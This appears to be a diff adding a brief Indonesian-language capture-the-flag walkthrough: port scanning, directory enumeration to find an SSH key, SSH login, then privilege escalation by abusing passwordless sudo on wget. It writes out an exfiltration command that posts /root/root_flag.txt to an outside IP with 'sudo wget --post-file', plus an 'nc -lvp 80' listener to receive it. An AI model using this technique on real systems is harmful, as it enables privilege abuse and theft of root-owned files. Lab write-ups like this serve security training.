@@ -1,0 +1,14 @@
+1. scanning port pada mesin
+2. lakukan directory enumeration samapai ketemu kunci public ssh
+3. lakukan ssh ke target 
+4. cari user_flag.txt
+5. lakuakan privilage escalation dengan perintah sudo -l
+6. terdapat perintah /usr/bin/wget dapat menggunakan sudo tanpa password
+7. lakukan post file /root/root_flag.txt ke mesin local
+   a. perintah dari victim sudo /usr/bin/wget --post-file=/root/root_flag.txt  10.2.54.243 
+   b. perintah di local nc -lvp 80
+   c. langkah di atas akan mengirim file root_flag.txt ke local yang statusnya listening pada port 80
+8. dapatkan root_flag.txt di local.
+
+
+
